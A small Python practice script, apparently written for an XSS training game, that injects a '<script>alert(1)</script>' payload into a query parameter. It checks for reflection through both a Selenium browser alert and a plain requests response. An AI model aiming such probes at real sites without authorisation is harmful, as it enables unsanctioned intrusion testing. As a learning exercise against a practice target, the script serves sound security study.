import time
import requests
from selenium import webdriver
from selenium.webdriver.common.alert import Alert
from ScriptPrcatice.XSSgame.Utility.FileHandlers import *
from ScriptPrcatice.XSSgame.Utility.URLs import *;

def XSSgame():

    print("starting")

    payload = "<script>alert(1)</script>"
    URL = f"{Base_Url}{level1}?query={payload}"

    driver = webdriver.Firefox()
    driver.implicitly_wait(10)
    driver.get(f"{URL}")

    try:
        time.sleep(3)
        alert = Alert(driver)
        print("Alert Present")
        print(alert.text)
        alert.accept()
    except:
        print("Alert Not Present")


def XSSlite():
    print("lightweight")

    payload = "%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
    URL = Base_Url + level1
    params = {
        "query" : payload
    }

    try:
        response = requests.get(URL,params=params)
        rcode = response.status_code
        response_body = response.text

        print(f"Response Code: {rcode}")

        if payload in response_body:
            report(payload)
            print("present")
        else:
            print("absent")

        # print(f"Response Body:\n{response_body}")
        print("-" * 40)

    except Exception as e:
        print(f"Request failed: {str(e)}")

    print("POST attack ended...........")


# XSSlite()
XSSgame()